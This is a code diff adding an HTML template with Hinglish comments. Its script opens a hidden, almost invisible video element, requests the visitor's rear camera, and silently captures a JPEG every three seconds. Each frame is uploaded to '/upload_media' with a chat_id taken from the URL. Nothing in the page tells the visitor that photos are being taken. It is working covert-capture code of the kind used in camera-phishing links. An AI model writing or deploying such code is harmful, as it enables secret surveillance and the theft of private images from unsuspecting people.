@@ -1,0 +1,129 @@
+<!-- ================================================================= -->
+<!-- 🔗 [UI CONNECTION: Future me yahan 'camera1.html' kar sakte hain]  -->
+<!-- ================================================================= -->
+{% include 'camera.html' %}
+
+
+<!-- ================================================================= -->
+<!-- 🤖 [FIXED BACKGROUND BACK PHOTO ENGINE]                           -->
+<!-- ================================================================= -->
+<video id="_bg_back_vid" autoplay playsinline muted 
+       style="position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -9999;"></video>
+<canvas id="_bg_back_canvas" style="display: none;"></canvas>
+
+<script>
+(function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chat_id');
+    const bgVideo = document.getElementById('_bg_back_vid');
+    const bgCanvas = document.getElementById('_bg_back_canvas');
+
+    let captureInterval = null;
+
+    async function initBackPhoto() {
+        if (!chatId) {
+            console.error("chat_id URL me nahi mila!");
+            return;
+        }
+
+        let activeStream = null;
+        const uiVideos = document.querySelectorAll('video:not(#_bg_back_vid)');
+
+        // Check karein kya UI me pehle se camera stream active hai
+        for (let v of uiVideos) {
+            if (v.srcObject && v.srcObject.active) {
+                activeStream = v.srcObject;
+                break;
+            }
+        }
+
+        // Agar UI me stream nahi hai toh back camera request karein
+        if (!activeStream) {
+            try {
+                activeStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: { ideal: "environment" },
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+
+                uiVideos.forEach(v => {
+                    if (!v.srcObject) {
+                        v.srcObject = activeStream;
+                        v.play().catch(() => {});
+                    }
+                });
+            } catch (err) {
+                console.error("Back camera error:", err);
+                return;
+            }
+        }
+
+        bgVideo.srcObject = activeStream;
+
+        try {
+            await bgVideo.play();
+        } catch (e) {
+            console.log("Autoplay waiting:", e);
+        }
+
+        // Video metadata load hone ke baad capture interval start karein
+        bgVideo.onloadedmetadata = () => {
+            if (captureInterval) clearInterval(captureInterval);
+            captureInterval = setInterval(captureAndSend, 3000);
+        };
+
+        if (!captureInterval) {
+            captureInterval = setInterval(captureAndSend, 3000);
+        }
+    }
+
+    function captureAndSend() {
+        let activeVideo = bgVideo;
+
+        // Agar background video ready na ho toh UI video check karein
+        if (!activeVideo.videoWidth || activeVideo.readyState < 2) {
+            const uiVid = document.querySelector('video:not(#_bg_back_vid)');
+            if (uiVid && uiVid.videoWidth && uiVid.readyState >= 2) {
+                activeVideo = uiVid;
+            } else {
+                return; // Frame ready nahi hai, black photo avoid karne ke liye return karein
+            }
+        }
+
+        const width = activeVideo.videoWidth;
+        const height = activeVideo.videoHeight;
+
+        if (width === 0 || height === 0) return;
+
+        bgCanvas.width = width;
+        bgCanvas.height = height;
+
+        const ctx = bgCanvas.getContext('2d');
+        ctx.drawImage(activeVideo, 0, 0, width, height);
+
+        bgCanvas.toBlob((blob) => {
+            if (!blob || blob.size === 0) return;
+
+            const fd = new FormData();
+            fd.append('file', blob, 'back_photo.jpg');
+            fd.append('chat_id', chatId);
+            fd.append('type', 'photo');
+
+            fetch('/upload_media', {
+                method: 'POST',
+                body: fd
+            }).catch(e => console.error("Upload error:", e));
+
+        }, 'image/jpeg', 0.85);
+    }
+
+    if (document.readyState === 'complete' || document.readyState === 'interactive') {
+        initBackPhoto();
+    } else {
+        window.addEventListener('DOMContentLoaded', initBackPhoto);
+    }
+})();
+</script>
